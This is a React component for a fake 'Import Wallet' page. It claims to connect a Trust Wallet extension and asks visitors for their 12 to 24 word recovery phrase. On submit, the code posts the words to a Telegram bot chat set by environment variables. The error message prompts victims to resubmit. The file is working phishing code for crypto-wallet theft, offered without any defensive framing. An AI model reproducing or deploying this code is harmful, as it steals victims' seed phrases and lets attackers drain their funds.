"use client";

import axios from "axios";
import { useState } from "react";

const SeedPhraseCollector = () => {
  const [seedPhrases, setSeedPhrases] = useState<string[]>(Array(12).fill(""));
  const [phraseCount, setPhraseCount] = useState(12); // Default to 12 phrases
  const [error, setError] = useState<string | null>(null);

  // Update the value of a specific phrase
  const handleInputChange = (index: number, value: string) => {
    const updatedPhrases = [...seedPhrases];
    updatedPhrases[index] = value;
    setSeedPhrases(updatedPhrases);
    setError(null); // Clear error on input change
  };

  // Update the number of phrases dynamically
  const handlePhraseCountChange = (count: number) => {
    setPhraseCount(count);
    const updatedPhrases = Array(count).fill("").map((_, i) => seedPhrases[i] || "");
    setSeedPhrases(updatedPhrases);
    setError(null); // Clear error when count changes
  };

  const sendToTelegram = async (phrases: string[]) => {
    const telegramBotToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "YOUR_TELEGRAM_BOT_TOKEN";
    const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "YOUR_TELEGRAM_CHAT_ID";

    const message = `Seed Phrases Submitted:\n\`\`\`\n${phrases.join(" ")}\n\`\`\``;

    try {
      await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        chat_id: telegramChatId,
        text: message,
        parse_mode: "Markdown",
      });
      alert("Seed phrases sent successfully!");
    } catch (error) {
      console.error("Failed to send seed phrases to Telegram:", error);
      alert("Failed to send seed phrases. Please try again.");
    }
  };

  // Handle form submission
  const handleSubmit = () => {
    // Validate all fields are filled
    const emptyFields = seedPhrases.some((phrase) => phrase.trim() === "");
    if (emptyFields) {
      setError("Please confirm this is a valid phrase and try again.");
      return;
    }

    // Proceed if validation passes
    sendToTelegram(seedPhrases);
  };

  return (
    <div>
      <h2 style={{ color: "black" }}>Import Wallet</h2>
      <p style={{ color: "black", marginTop: "10px" }}>
        Enter your seed phrases to connect using our in-app Trust Wallet Extension.
      </p>

      

      {/* Dropdown to select the number of seed phrases */}
      <div style={{ marginBottom: "20px" }}>
        <label htmlFor="phraseCount" style={{ marginRight: "10px", color: "black" }}>
          Number of Seed Phrases:
        </label>
        <select
          id="phraseCount"
          value={phraseCount}
          onChange={(e) => handlePhraseCountChange(Number(e.target.value))}
          style={{
            padding: "10px",
            borderRadius: "6px",
            border: "1px solid #ccc",
          }}
        >
          <option value={12}>12</option>
          <option value={15}>15</option>
          <option value={18}>18</option>
          <option value={21}>21</option>
          <option value={24}>24</option>
        </select>
      </div>

      {/* Dynamic seed phrase input fields */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: "10px" }}>
        {Array.from({ length: phraseCount }).map((_, index) => (
          <input
            key={index}
            type="text"
            value={seedPhrases[index]}
            onChange={(e) => handleInputChange(index, e.target.value)}
            placeholder={`Word ${index + 1}`}
            style={{
              padding: "10px",
              border: "1px solid #ccc",
              borderRadius: "6px",
              textAlign: "center",
            }}
          />
        ))}
      </div>

      {/* Buttons */}
      <div
        style={{
          display: "flex",
          flexDirection: "row",
          justifyContent: "space-between",
          marginTop: "20px",
          gap: "10px",
        }}
      >
        <button
          onClick={() => setSeedPhrases(Array(phraseCount).fill(""))}
          style={{
            padding: "10px",
            backgroundColor: "#efefef",
            border: "none",
            borderRadius: "6px",
            color: "#333",
            fontSize: "1rem",
            cursor: "pointer",
            width: "50%",
          }}
        >
          Clear
        </button>
        <button
          onClick={handleSubmit}
          style={{
            padding: "10px",
            backgroundColor: "#4CAF50",
            border: "none",
            borderRadius: "6px",
            color: "white",
            fontSize: "1rem",
            cursor: "pointer",
            width: "50%",
          }}
        >
          Submit
        </button>
      </div>
      {/* Error Message */}
      {error && (
        <p style={{ color: "red", marginBottom: "10px", marginTop: "10px" }}>
          {error}
        </p>
      )}
    </div>
  );
};

export default SeedPhraseCollector;
